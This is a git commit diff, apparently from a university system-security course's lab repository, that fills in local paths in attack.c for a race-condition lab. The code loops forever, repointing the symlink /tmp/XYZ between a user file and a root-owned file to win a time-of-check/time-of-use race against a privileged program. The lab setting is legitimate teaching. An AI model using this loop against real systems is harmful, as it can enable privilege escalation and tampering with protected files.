e2e2c2d3697234a66cedfed21df7400d8d63a306
ctc <is208_ctc@163.com>
2018-05-13 22:33:17 +0800

    update for Lab4

--- Lab3/race_condition/attack.c
+++ Lab3/race_condition/attack.c
@@ -1,8 +1,8 @@
 int main()
 {
     while(1){
-        system("ln -sf /PATH/TO/YOUR/DERECTORY/is308_labs/Lab3/race_condition/tmp_file /tmp/XYZ");
-        system("ln -sf /PATH/TO/YOUR/DERECTORY/is308_labs/Lab3/race_condition/root_file /tmp/XYZ");
+        system("ln -sf /home/mxgc/SJTU/LoCCS/Courses/SysSec2018Spring/labs/is308_labs/Lab3/race_condition/tmp_file /tmp/XYZ");
+        system("ln -sf /home/mxgc/SJTU/LoCCS/Courses/SysSec2018Spring/labs/is308_labs/Lab3/race_condition/root_file /tmp/XYZ");
     }
     return 0;
 }
